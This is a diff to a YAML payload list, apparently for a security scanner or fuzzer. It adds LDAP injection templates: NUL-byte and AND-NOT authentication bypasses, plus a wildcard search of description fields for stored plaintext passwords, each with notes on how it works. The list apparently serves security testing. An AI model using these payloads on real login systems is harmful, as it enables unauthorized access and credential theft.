@@ -25,6 +25,18 @@ payloads:
     template: "*)(|(cn=*)(sn=*)(mail=*)(ou=*"
     confidence: suspected
     notes: Attribute enumeration probe; wildcard tests multiple common LDAP attribute names.
+  - id: ldap_authbypass_nul_truncate
+    template: "admin)(uid=*))%00"
+    confidence: suspected
+    notes: NUL-byte truncation on C-backed LDAP servers; truncates the trailing password clause so the uid-only predicate matches.
+  - id: ldap_notpassword_bypass
+    template: "admin)(!(userPassword=ZZZ))"
+    confidence: suspected
+    notes: AND-NOT tautology; matches any entry whose password differs from the literal ZZZ, bypassing auth without guessing credentials.
+  - id: ldap_description_field_enum
+    template: "*)(description=*pass*"
+    confidence: suspected
+    notes: Enumerates description/info attributes where administrators misuse free-text fields to stash plaintext credentials.
 mutations:
   - name: case_flip
     description: Flip case of LDAP attribute names to probe case-insensitive filter handling.
